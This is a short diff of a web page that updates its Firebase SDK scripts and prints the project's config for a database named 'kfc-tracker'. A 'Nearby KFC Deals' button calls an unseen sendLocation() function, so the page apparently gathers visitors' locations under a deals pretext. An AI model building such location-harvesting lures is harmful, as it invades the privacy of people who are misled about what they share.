@@ -93,10 +93,13 @@
     <button class="btn" onclick="sendLocation()">🔎 Nearby KFC Deals</button>
   </div>
 
-<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js"></script>
+<!-- Firebase CDN SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+<!-- Firebase Initialization -->
 <script>
- const firebaseConfig = {
+const firebaseConfig = {
   apiKey: "AIzaSyCG7XY_KjzJkfLWtUSgarDLritenEbbvSY",
   authDomain: "kfc-tracker.firebaseapp.com",
   databaseURL: "https://kfc-tracker-default-rtdb.firebaseio.com",
@@ -106,9 +109,13 @@
   appId: "1:127099679000:web:4a4f5e66a5b99c63882e6d",
   measurementId: "G-EPEXKK3S37"
 };
+
   firebase.initializeApp(firebaseConfig);
   const db = firebase.database();
 </script>
+
+<!-- Now your existing code using `db` will work -->
+
 
 <script>
   const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
@@ -208,6 +215,7 @@
 
 </body>
 </html>
+
 
 
 
